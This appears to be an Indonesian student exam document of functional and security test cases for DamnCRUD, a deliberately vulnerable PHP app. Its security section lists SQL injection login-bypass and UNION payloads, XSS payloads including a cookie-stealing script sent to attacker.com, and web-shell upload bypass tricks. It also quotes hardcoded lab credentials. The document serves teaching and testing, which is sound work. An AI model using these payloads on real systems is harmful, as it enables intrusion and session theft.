# DOKUMEN TEST CASES
## Pengujian Aplikasi DamnCRUD
### Ujian Akhir Semester - Pengujian Perangkat Lunak

---

| Informasi Dokumen | Detail |
|---|---|
| Nama Dokumen | Test Cases Aplikasi DamnCRUD |
| Versi | 1.0 |
| Tanggal | 23 Februari 2026 |
| Aplikasi | DamnCRUD (PHP CRUD Application) |

---

## BAGIAN A: PENGUJIAN FUNGSIONAL

---

### MODUL 1: AUTENTIKASI (LOGIN)

---

#### TC-F-001: Login dengan Username dan Password Valid

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-001 |
| **Nama Test Case** | Login dengan kredensial valid |
| **Modul** | Autentikasi / Login |
| **Tujuan** | Memverifikasi bahwa pengguna dapat login dengan username dan password yang benar |
| **Prioritas** | High |
| **Tipe** | Positive Test |

**Precondition (Prasyarat):**
- Aplikasi dapat diakses di browser
- Database sudah terinstall dengan data user admin
- User belum login (belum ada sesi aktif)

**Test Steps (Langkah Pengujian):**

| No | Langkah | Data Input |
|---|---|---|
| 1 | Buka browser, akses `http://localhost/DamnCRUD/login.php` | - |
| 2 | Masukkan username | `admin` |
| 3 | Masukkan password | `nimda666!` |
| 4 | Klik tombol "OK I'm sign in" | - |

**Expected Result (Hasil yang Diharapkan):**
- Sistem melakukan validasi kredensial
- Pengguna diarahkan ke halaman `index.php` (Dashboard)
- Halaman dashboard menampilkan pesan "Howdy, damn admin!"
- Sesi pengguna tersimpan dengan nilai `$_SESSION['user'] = 'admin'`

**Actual Result (Hasil Aktual):** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

#### TC-F-002: Login dengan Password Salah

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-002 |
| **Nama Test Case** | Login dengan password tidak valid |
| **Modul** | Autentikasi / Login |
| **Tujuan** | Memverifikasi bahwa sistem menolak login dengan password yang salah |
| **Prioritas** | High |
| **Tipe** | Negative Test |

**Precondition:**
- Aplikasi dapat diakses di browser
- User belum login

**Test Steps:**

| No | Langkah | Data Input |
|---|---|---|
| 1 | Buka `http://localhost/DamnCRUD/login.php` | - |
| 2 | Masukkan username | `admin` |
| 3 | Masukkan password yang salah | `passwordsalah` |
| 4 | Klik tombol "OK I'm sign in" | - |

**Expected Result:**
- Sistem menolak login
- Pengguna tetap berada di halaman `login.php`
- Muncul pesan error: **"Damn, wrong credentials!!"**
- Tidak ada sesi yang dibuat

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

#### TC-F-003: Login dengan Username Salah

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-003 |
| **Nama Test Case** | Login dengan username tidak valid |
| **Modul** | Autentikasi / Login |
| **Tujuan** | Memverifikasi bahwa sistem menolak login dengan username yang tidak terdaftar |
| **Prioritas** | High |
| **Tipe** | Negative Test |

**Test Steps:**

| No | Langkah | Data Input |
|---|---|---|
| 1 | Buka `http://localhost/DamnCRUD/login.php` | - |
| 2 | Masukkan username yang tidak ada | `userpalsu` |
| 3 | Masukkan password apapun | `password123` |
| 4 | Klik tombol "OK I'm sign in" | - |

**Expected Result:**
- Sistem menolak login
- Muncul pesan error: "Damn, wrong credentials!!"
- Tetap berada di halaman login

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

#### TC-F-004: Login dengan Field Kosong

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-004 |
| **Nama Test Case** | Login dengan field kosong |
| **Modul** | Autentikasi / Login |
| **Tujuan** | Memverifikasi validasi form ketika field dibiarkan kosong |
| **Prioritas** | Medium |
| **Tipe** | Negative Test |

**Test Steps:**

| No | Langkah | Data Input |
|---|---|---|
| 1 | Buka `http://localhost/DamnCRUD/login.php` | - |
| 2 | Biarkan username kosong | (kosong) |
| 3 | Biarkan password kosong | (kosong) |
| 4 | Klik tombol "OK I'm sign in" | - |

**Expected Result:**
- Form HTML5 menampilkan validasi "Please fill out this field"
- Form tidak dikirimkan ke server
- Baris dengan atribut `required` pada username dan password mencegah pengiriman

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

### MODUL 2: DASHBOARD (INDEX)

---

#### TC-F-005: Tampilan Dashboard Setelah Login

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-005 |
| **Nama Test Case** | Tampilan daftar kontak di dashboard |
| **Modul** | Dashboard |
| **Tujuan** | Memverifikasi bahwa dashboard menampilkan daftar kontak dengan benar |
| **Prioritas** | Medium |
| **Tipe** | Positive Test |

**Precondition:** User sudah login sebagai admin

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Login dengan kredensial valid |
| 2 | Amati halaman dashboard yang muncul |
| 3 | Periksa tabel daftar kontak |
| 4 | Periksa kolom yang ditampilkan (#, Name, Email, Phone, Title, Created) |
| 5 | Periksa keberadaan tombol Edit dan Delete di setiap baris |

**Expected Result:**
- Halaman menampilkan salam "Howdy, damn admin!"
- Tabel daftar kontak tampil dengan data dari database
- Semua kolom (ID, Name, Email, Phone, Title, Created) terisi
- Setiap baris memiliki tombol "edit" (hijau) dan "delete" (merah)
- Fitur DataTable aktif (search, sort, pagination)
- Menu navigasi tampil (Add New Contact, Profil, VPage, Sign out)

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

#### TC-F-006: Akses Dashboard Tanpa Login (Proteksi Sesi)

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-006 |
| **Nama Test Case** | Akses halaman dashboard tanpa autentikasi |
| **Modul** | Dashboard / Session |
| **Tujuan** | Memverifikasi bahwa halaman terproteksi tidak dapat diakses tanpa login |
| **Prioritas** | High |
| **Tipe** | Negative Test / Security |

**Precondition:** User belum login (tidak ada sesi aktif)

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Buka browser baru atau mode incognito |
| 2 | Langsung akses `http://localhost/DamnCRUD/index.php` tanpa login |

**Expected Result:**
- Sistem mendeteksi tidak ada sesi aktif
- Pengguna diarahkan (redirect) ke `login.php`
- Konten dashboard tidak ditampilkan

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

### MODUL 3: TAMBAH KONTAK (CREATE)

---

#### TC-F-007: Tambah Kontak Baru dengan Data Valid

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-007 |
| **Nama Test Case** | Menambah kontak baru dengan data lengkap |
| **Modul** | Create Contact |
| **Tujuan** | Memverifikasi bahwa pengguna dapat menambah kontak baru |
| **Prioritas** | High |
| **Tipe** | Positive Test |

**Precondition:** User sudah login

**Test Steps:**

| No | Langkah | Data Input |
|---|---|---|
| 1 | Dari dashboard, klik tombol "Add New Contact" | - |
| 2 | Isi field Name | `Budi Santoso` |
| 3 | Isi field Email | `budi@email.com` |
| 4 | Isi field Phone | `081234567890` |
| 5 | Isi field Title | `Manager` |
| 6 | Klik tombol "Save" | - |

**Expected Result:**
- Data kontak tersimpan ke database
- Pengguna diarahkan kembali ke `index.php`
- Kontak baru "Budi Santoso" muncul di daftar kontak

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

#### TC-F-008: Tambah Kontak dengan Field Kosong

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-008 |
| **Nama Test Case** | Menambah kontak dengan field wajib kosong |
| **Modul** | Create Contact |
| **Tujuan** | Memverifikasi validasi input saat field wajib tidak diisi |
| **Prioritas** | Medium |
| **Tipe** | Negative Test |

**Test Steps:**

| No | Langkah | Data Input |
|---|---|---|
| 1 | Akses halaman `create.php` | - |
| 2 | Biarkan field Name kosong | (kosong) |
| 3 | Isi Email | `test@email.com` |
| 4 | Isi Phone | `08123456789` |
| 5 | Isi Title | `Staff` |
| 6 | Klik tombol "Save" | - |

**Expected Result:**
- Validasi HTML5 mencegah pengiriman form
- Muncul pesan "Please fill out this field" pada field Name
- Data tidak tersimpan ke database

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

### MODUL 4: EDIT KONTAK (UPDATE)

---

#### TC-F-009: Edit Kontak dengan Data Valid

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-009 |
| **Nama Test Case** | Edit data kontak yang sudah ada |
| **Modul** | Update Contact |
| **Tujuan** | Memverifikasi bahwa pengguna dapat mengubah data kontak |
| **Prioritas** | High |
| **Tipe** | Positive Test |

**Precondition:** User sudah login dan ada kontak di daftar

**Test Steps:**

| No | Langkah | Data Input |
|---|---|---|
| 1 | Dari dashboard, klik tombol "edit" pada salah satu kontak | - |
| 2 | Periksa apakah data lama sudah terisi di form | - |
| 3 | Ubah field Name | `John Updated` |
| 4 | Ubah field Title | `Senior Manager` |
| 5 | Klik tombol "Update" | - |

**Expected Result:**
- Data kontak berhasil diupdate di database
- Pengguna diarahkan kembali ke `index.php`
- Data baru tampil di daftar kontak

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

#### TC-F-010: Verifikasi Bug - Field Phone Kosong di Form Edit

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-010 |
| **Nama Test Case** | Verifikasi bug field Phone pada halaman edit |
| **Modul** | Update Contact |
| **Tujuan** | Mengkonfirmasi bug bahwa field Phone tidak menampilkan nilai yang ada |
| **Prioritas** | Medium |
| **Tipe** | Bug Verification |

**Precondition:** User sudah login, ada kontak dengan nomor phone tersimpan

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Dari dashboard, klik tombol "edit" pada kontak yang memiliki nomor phone |
| 2 | Amati field "Phone number" di form edit |

**Expected Result (Seharusnya):**
- Field Phone menampilkan nomor telepon yang sudah tersimpan

**Actual Result (Bug):**
- Field Phone **kosong** (tidak menampilkan nilai yang ada)
- Ini adalah bug karena `value=""` di `update.php:50` bukan `value="<?= $contact['phone'] ?>"`

**Referensi Kode:** `update.php` baris 50:
```php
// BUGGY CODE:
<input ... name="phone" value="" id="phone">
// SEHARUSNYA:
<input ... name="phone" value="<?= $contact['phone'] ?>" id="phone">
```

**Status:** *(Bug Confirmed / Not Reproduced)*

---

#### TC-F-011: Edit Kontak dengan ID Tidak Valid

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-011 |
| **Nama Test Case** | Akses halaman edit dengan ID tidak valid |
| **Modul** | Update Contact |
| **Tujuan** | Memverifikasi penanganan error ketika ID kontak tidak ada |
| **Prioritas** | Medium |
| **Tipe** | Negative Test |

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Login terlebih dahulu |
| 2 | Akses URL: `http://localhost/DamnCRUD/update.php?id=99999` |

**Expected Result:**
- Sistem menampilkan pesan "Contact doesn't exist!"
- Tidak ada error fatal

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

#### TC-F-012: Akses Halaman Edit Tanpa Parameter ID

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-012 |
| **Nama Test Case** | Akses update.php tanpa parameter ID |
| **Modul** | Update Contact |
| **Tujuan** | Memverifikasi penanganan error ketika parameter ID tidak ada |
| **Prioritas** | Low |
| **Tipe** | Negative Test |

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Login terlebih dahulu |
| 2 | Akses URL: `http://localhost/DamnCRUD/update.php` (tanpa parameter id) |

**Expected Result:**
- Sistem menampilkan pesan "No ID specified!"

**Catatan:** `update.php` tidak memiliki pengecekan sesi, sehingga halaman dapat diakses tanpa login - ini adalah bug keamanan.

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

### MODUL 5: HAPUS KONTAK (DELETE)

---

#### TC-F-013: Hapus Kontak yang Ada

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-013 |
| **Nama Test Case** | Hapus kontak dari daftar |
| **Modul** | Delete Contact |
| **Tujuan** | Memverifikasi bahwa pengguna dapat menghapus kontak |
| **Prioritas** | High |
| **Tipe** | Positive Test |

**Precondition:** User sudah login, ada kontak di daftar

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Dari dashboard, klik tombol "delete" pada salah satu kontak |
| 2 | Muncul dialog konfirmasi "Damn, what r u doin'? Are you sure?" |
| 3 | Klik "OK" untuk konfirmasi |

**Expected Result:**
- Kontak terhapus dari database
- Pengguna diarahkan kembali ke `index.php`
- Kontak yang dihapus tidak lagi muncul di daftar

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

#### TC-F-014: Batal Hapus Kontak

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-014 |
| **Nama Test Case** | Batal menghapus kontak |
| **Modul** | Delete Contact |
| **Tujuan** | Memverifikasi bahwa konfirmasi batal (Cancel) tidak menghapus data |
| **Prioritas** | Medium |
| **Tipe** | Positive Test |

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Dari dashboard, klik tombol "delete" pada salah satu kontak |
| 2 | Muncul dialog konfirmasi |
| 3 | Klik "Cancel" / "Batal" |

**Expected Result:**
- Pengguna tetap berada di halaman dashboard
- Kontak tidak terhapus
- Data tetap ada di daftar

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

### MODUL 6: LOGOUT

---

#### TC-F-015: Logout dari Aplikasi

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-015 |
| **Nama Test Case** | Logout / keluar dari sesi |
| **Modul** | Logout |
| **Tujuan** | Memverifikasi bahwa sesi berhasil dihentikan saat logout |
| **Prioritas** | High |
| **Tipe** | Positive Test |

**Precondition:** User sudah login

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Dari halaman manapun, klik tombol "Sign out" di menu |
| 2 | Amati hasil redirect |
| 3 | Coba akses `index.php` setelah logout |

**Expected Result:**
- Sesi dihancurkan (session_destroy())
- Pengguna diarahkan ke `login.php`
- Mencoba akses `index.php` setelah logout → redirect ke `login.php`

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

### MODUL 7: PROFIL & UPLOAD FOTO

---

#### TC-F-016: Upload Foto Profil dengan File JPG Valid

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-016 |
| **Nama Test Case** | Upload foto profil dengan file JPG |
| **Modul** | Profil |
| **Tujuan** | Memverifikasi bahwa upload foto profil dengan format JPG berhasil |
| **Prioritas** | Medium |
| **Tipe** | Positive Test |

**Precondition:** User sudah login, memiliki file JPG untuk diupload

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Akses menu "Profil" |
| 2 | Klik "Choose File" / "Browse" |
| 3 | Pilih file berekstensi .jpg |
| 4 | Klik tombol "Change" |

**Expected Result:**
- File berhasil diupload
- Foto profil diperbarui di halaman profil
- Redirect kembali ke `profil.php`

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

#### TC-F-017: Upload File dengan Ekstensi Tidak Valid

| Field | Detail |
|---|---|
| **ID Test Case** | TC-F-017 |
| **Nama Test Case** | Upload file non-JPG ke foto profil |
| **Modul** | Profil |
| **Tujuan** | Memverifikasi validasi ekstensi file pada upload foto profil |
| **Prioritas** | Medium |
| **Tipe** | Negative Test |

**Test Steps:**

| No | Langkah | Data Input |
|---|---|---|
| 1 | Akses menu "Profil" | - |
| 2 | Pilih file dengan ekstensi .png | file.png |
| 3 | Klik tombol "Change" | - |

**Expected Result:**
- Sistem menolak file
- Muncul pesan error: **"Ekstensi tidak diijinkan. Hanya menerima file JPG/JPEG"**
- File tidak terupload

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

## BAGIAN B: PENGUJIAN KEAMANAN (SECURITY TESTING)

---

### S-01: SQL INJECTION

---

#### TC-S-001: SQL Injection pada Field Username

| Field | Detail |
|---|---|
| **ID Test Case** | TC-S-001 |
| **Nama Test Case** | SQL Injection - Authentication Bypass via Username |
| **Modul** | Login |
| **Tujuan** | Menguji apakah form login rentan terhadap SQL Injection |
| **Prioritas** | Critical |
| **Tipe** | Security / Exploit Test |
| **Referensi** | OWASP A03:2021 - Injection |

**Vulnerability Analysis:**
Kode di `login.php` baris 21 melakukan string concatenation:
```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = "' . $user . '"
AND password = "' . hash('sha256', $pass . $salt) . '" LIMIT 1');
```
Field `$user` (username) langsung digabungkan ke query tanpa sanitasi, namun field password sudah di-hash sehingga tidak bisa diinjeksi.

**Test Steps:**

| No | Langkah | Payload |
|---|---|---|
| 1 | Buka halaman `login.php` | - |
| 2 | Masukkan SQL injection payload di field username | `admin" -- ` |
| 3 | Masukkan password sembarang | `apapun` |
| 4 | Klik "OK I'm sign in" | - |

**Payload SQL yang diuji:**
```
admin" --
admin" #
admin" OR "1"="1
" OR 1=1 --
admin" OR 1=1 --
```

**Query yang terbentuk (contoh payload `admin" -- `):**
```sql
SELECT * FROM users WHERE username = "admin" -- " AND password = "..." LIMIT 1
-- Komentar (--) membuat kondisi password diabaikan!
```

**Expected Result (Vulnerable):**
- Jika rentan: Pengguna berhasil login **tanpa password yang benar**
- Ini adalah celah SQL Injection kategori **Authentication Bypass**

**Expected Result (Secure):**
- Sistem menolak login meskipun menggunakan payload SQL

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Vulnerable / Not Vulnerable)*

---

#### TC-S-002: SQL Injection - UNION Based (Ekstraksi Data)

| Field | Detail |
|---|---|
| **ID Test Case** | TC-S-002 |
| **Nama Test Case** | SQL Injection - UNION Attack pada Username |
| **Modul** | Login |
| **Tujuan** | Menguji apakah SQL Injection dapat mengekstrak data dari database |
| **Prioritas** | Critical |
| **Tipe** | Security Test |

**Payload yang diuji:**
```
" UNION SELECT 1,2,3,4,5 --
" UNION SELECT username, password, 3, 4, 5 FROM users --
```

**Expected Result:**
- Jika rentan: Data dari tabel lain dapat diekstrak
- Sistem yang aman harus menolak semua payload ini

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Vulnerable / Not Vulnerable)*

---

### S-02: CROSS-SITE SCRIPTING (XSS)

---

#### TC-S-003: Reflected XSS pada vpage.php

| Field | Detail |
|---|---|
| **ID Test Case** | TC-S-003 |
| **Nama Test Case** | Reflected XSS - Basic Script Injection |
| **Modul** | vpage.php |
| **Tujuan** | Menguji apakah vpage.php rentan terhadap XSS |
| **Prioritas** | High |
| **Tipe** | Security / Exploit Test |
| **Referensi** | OWASP A03:2021 - Injection |

**Vulnerability Analysis:**
Kode di `vpage.php` baris 44:
```php
echo ("Your thing is " . $_GET["thing"]);
```
Input dari GET parameter `thing` langsung di-echo tanpa sanitasi (htmlspecialchars).

**Test Steps:**

| No | Langkah | Payload |
|---|---|---|
| 1 | Login dan akses menu "VPage" | - |
| 2 | Masukkan XSS payload di field input | `<script>alert('XSS')</script>` |
| 3 | Klik "Submit" | - |
| 4 | Amati apakah popup alert muncul | - |

**Payload yang diuji:**

| No | Payload | Keterangan |
|---|---|---|
| 1 | `<script>alert('XSS')</script>` | Basic script injection |
| 2 | `<img src=x onerror=alert('XSS')>` | Event handler injection |
| 3 | `<b>BoldText</b>` | HTML injection |
| 4 | `<script>document.location='http://attacker.com?c='+document.cookie</script>` | Cookie stealing |
| 5 | `<svg onload=alert('XSS')>` | SVG-based XSS |

**URL yang terbentuk (contoh):**
```
http://localhost/DamnCRUD/vpage.php?thing=<script>alert('XSS')</script>
```

**Expected Result (Vulnerable):**
- Alert popup muncul di browser
- JavaScript dieksekusi di browser pengguna
- Ini adalah **Reflected XSS**

**Expected Result (Secure):**
- Script tidak dieksekusi
- Karakter `<>` di-encode menjadi `&lt;&gt;`

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Vulnerable / Not Vulnerable)*

---

#### TC-S-004: XSS via URL Parameter Langsung

| Field | Detail |
|---|---|
| **ID Test Case** | TC-S-004 |
| **Nama Test Case** | Reflected XSS via URL manipulation |
| **Modul** | vpage.php |
| **Tujuan** | Menguji XSS melalui manipulasi URL langsung di address bar |
| **Prioritas** | High |
| **Tipe** | Security Test |

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Login terlebih dahulu |
| 2 | Akses URL langsung: `http://localhost/DamnCRUD/vpage.php?thing=<script>alert(1)</script>` |
| 3 | Amati apakah alert muncul |

**Expected Result (Vulnerable):**
- Alert "1" muncul, membuktikan XSS berhasil

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Vulnerable / Not Vulnerable)*

---

### S-03: FILE UPLOAD BYPASS

---

#### TC-S-005: Upload File PHP Berbahaya

| Field | Detail |
|---|---|
| **ID Test Case** | TC-S-005 |
| **Nama Test Case** | File Upload - Bypass ekstensi dengan file PHP |
| **Modul** | Profil |
| **Tujuan** | Menguji apakah validasi upload dapat dibypass dengan file PHP |
| **Prioritas** | High |
| **Tipe** | Security Test |
| **Referensi** | OWASP A04:2021 - Insecure Design |

**Vulnerability Analysis:**
Kode di `profil.php` hanya memeriksa ekstensi file:
```php
$tmp = explode('.', $_FILES['image']['name']);
$file_ext = end($tmp);
$extensions = array("jpeg","jpg");
if(in_array($file_ext,$extensions) === false){
    $error = "Ekstensi tidak diijinkan...";
}
```
Validasi ini dapat dibypass dengan double extension (e.g., `shell.php.jpg`).

**Test Steps:**

| No | Langkah | Data Input |
|---|---|---|
| 1 | Buat file dengan nama `webshell.php` berisi `<?php echo "vulnerable"; ?>` | - |
| 2 | Rename file menjadi `webshell.php.jpg` (double extension) | - |
| 3 | Login dan akses halaman Profil | - |
| 4 | Upload file `webshell.php.jpg` | - |
| 5 | Akses `http://localhost/DamnCRUD/image/profile.jpg` | - |

**Payload lain yang diuji:**
- `shell.php%00.jpg` (null byte injection)
- `shell.pHp` (case variation)
- Upload file dengan MIME type manipulasi via Burp Suite

**Expected Result (Vulnerable):**
- File `webshell.php.jpg` berhasil diupload
- Namun server mengeksekusinya sebagai PHP jika konfigurasi Apache mengizinkan

**Expected Result (Secure):**
- Sistem menolak semua file kecuali JPG/JPEG asli
- Validasi berdasarkan MIME type, bukan hanya ekstensi

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Vulnerable / Not Vulnerable)*

---

### S-04: MISSING AUTHENTICATION

---

#### TC-S-006: Akses update.php Tanpa Autentikasi

| Field | Detail |
|---|---|
| **ID Test Case** | TC-S-006 |
| **Nama Test Case** | Bypass autentikasi pada halaman update.php |
| **Modul** | Update Contact |
| **Tujuan** | Menguji apakah update.php dapat diakses tanpa login |
| **Prioritas** | High |
| **Tipe** | Security Test |
| **Referensi** | OWASP A07:2021 - Identification and Authentication Failures |

**Vulnerability Analysis:**
`update.php` tidak memiliki pengecekan sesi (`session_start()` dan `$_SESSION['user']`), berbeda dengan halaman lain yang memiliki:
```php
if (!isset($_SESSION['user'])) {
    header("location: login.php");
}
```

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Buka browser baru / mode incognito (tanpa login) |
| 2 | Akses `http://localhost/DamnCRUD/update.php?id=1` |
| 3 | Amati apakah form edit muncul |

**Expected Result (Vulnerable):**
- Form edit kontak tampil tanpa harus login
- Data kontak dapat diubah oleh siapapun

**Expected Result (Secure):**
- Redirect ke halaman login

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Vulnerable / Not Vulnerable)*

---

#### TC-S-007: IDOR - Akses/Edit Kontak Orang Lain

| Field | Detail |
|---|---|
| **ID Test Case** | TC-S-007 |
| **Nama Test Case** | IDOR - Manipulasi ID kontak di URL |
| **Modul** | Update / Delete Contact |
| **Tujuan** | Menguji apakah ID kontak di URL dapat dimanipulasi |
| **Prioritas** | High |
| **Tipe** | Security Test |
| **Referensi** | OWASP A01:2021 - Broken Access Control |

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Login sebagai admin |
| 2 | Saat mengedit kontak ID 1, perhatikan URL: `update.php?id=1` |
| 3 | Ubah nilai ID di URL menjadi ID lain: `update.php?id=5` |
| 4 | Amati apakah data kontak lain dapat diakses dan diedit |

**Expected Result (Vulnerable):**
- Data kontak dengan ID berbeda dapat diakses dan dimodifikasi hanya dengan mengubah angka di URL

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Vulnerable / Not Vulnerable)*

---

### S-05: HARDCODED CREDENTIALS

---

#### TC-S-008: Verifikasi Hardcoded Credentials di Source Code

| Field | Detail |
|---|---|
| **ID Test Case** | TC-S-008 |
| **Nama Test Case** | Hardcoded database credentials |
| **Modul** | functions.php |
| **Tujuan** | Mengidentifikasi credential database yang tersimpan langsung di kode |
| **Prioritas** | Medium |
| **Tipe** | Static Analysis / Code Review |
| **Referensi** | OWASP A02:2021 - Cryptographic Failures |

**Vulnerability Analysis (Code Review):**
Di `functions.php` baris 3-7:
```php
function pdo_connect(){
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'root123';    // ← HARDCODED PASSWORD
    $DATABASE_NAME = 'badcrud';
```

**Finding:**
- Password database `root123` tersimpan langsung di source code
- Jika source code bocor, attacker dapat mengakses database langsung
- Seharusnya menggunakan environment variables atau file konfigurasi terpisah

**Status:** **Confirmed Vulnerability**

---

### S-06: SESSION MANAGEMENT

---

#### TC-S-009: Sesi Tidak Terhapus Setelah Timeout

| Field | Detail |
|---|---|
| **ID Test Case** | TC-S-009 |
| **Nama Test Case** | Session tidak memiliki timeout otomatis |
| **Modul** | Semua halaman |
| **Tujuan** | Menguji apakah sesi memiliki batas waktu ekspirasi |
| **Prioritas** | Medium |
| **Tipe** | Security Test |

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Login ke aplikasi |
| 2 | Diamkan browser selama 30 menit tanpa aktivitas |
| 3 | Coba refresh atau akses halaman |

**Expected Result (Secure):**
- Sesi berakhir otomatis setelah periode tidak aktif
- Pengguna diarahkan ke login

**Expected Result (Vulnerable):**
- Sesi tetap aktif meskipun tidak ada aktivitas

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

#### TC-S-010: Verifikasi Informasi Sesi di Browser

| Field | Detail |
|---|---|
| **ID Test Case** | TC-S-010 |
| **Nama Test Case** | Pemeriksaan cookie session |
| **Modul** | Semua halaman |
| **Tujuan** | Menguji keamanan cookie sesi |
| **Tipe** | Security Test |

**Test Steps:**

| No | Langkah |
|---|---|
| 1 | Login ke aplikasi |
| 2 | Buka Developer Tools (F12) → Application → Cookies |
| 3 | Periksa cookie PHPSESSID |

**Pemeriksaan:**
- Apakah cookie memiliki flag `HttpOnly`?
- Apakah cookie memiliki flag `Secure`?
- Apakah cookie memiliki `SameSite` attribute?

**Expected Result (Secure):**
- Cookie memiliki flag HttpOnly dan Secure

**Actual Result:** *(diisi saat eksekusi)*

**Status:** *(Pass / Fail)*

---

## RINGKASAN TEST CASES

### Pengujian Fungsional
| ID | Nama Test Case | Prioritas | Tipe |
|---|---|---|---|
| TC-F-001 | Login kredensial valid | High | Positive |
| TC-F-002 | Login password salah | High | Negative |
| TC-F-003 | Login username salah | High | Negative |
| TC-F-004 | Login field kosong | Medium | Negative |
| TC-F-005 | Tampilan dashboard | Medium | Positive |
| TC-F-006 | Akses dashboard tanpa login | High | Security |
| TC-F-007 | Tambah kontak valid | High | Positive |
| TC-F-008 | Tambah kontak field kosong | Medium | Negative |
| TC-F-009 | Edit kontak valid | High | Positive |
| TC-F-010 | Bug field phone di edit | Medium | Bug Verification |
| TC-F-011 | Edit dengan ID tidak valid | Medium | Negative |
| TC-F-012 | Edit tanpa parameter ID | Low | Negative |
| TC-F-013 | Hapus kontak | High | Positive |
| TC-F-014 | Batal hapus kontak | Medium | Positive |
| TC-F-015 | Logout | High | Positive |
| TC-F-016 | Upload foto JPG valid | Medium | Positive |
| TC-F-017 | Upload file non-JPG | Medium | Negative |

### Pengujian Keamanan
| ID | Nama Test Case | Prioritas | Tipe |
|---|---|---|---|
| TC-S-001 | SQL Injection - Auth Bypass | Critical | Security |
| TC-S-002 | SQL Injection - UNION Attack | Critical | Security |
| TC-S-003 | Reflected XSS - Script Injection | High | Security |
| TC-S-004 | XSS via URL | High | Security |
| TC-S-005 | File Upload Bypass | High | Security |
| TC-S-006 | Missing Auth di update.php | High | Security |
| TC-S-007 | IDOR - Manipulasi ID | High | Security |
| TC-S-008 | Hardcoded Credentials | Medium | Code Review |
| TC-S-009 | Session Timeout | Medium | Security |
| TC-S-010 | Cookie Security | Medium | Security |

**Total Test Cases: 27**
- Fungsional: 17 Test Cases
- Keamanan: 10 Test Cases

---

*Dokumen ini dibuat sebagai bagian dari Ujian Akhir Semester Mata Kuliah Pengujian Perangkat Lunak*
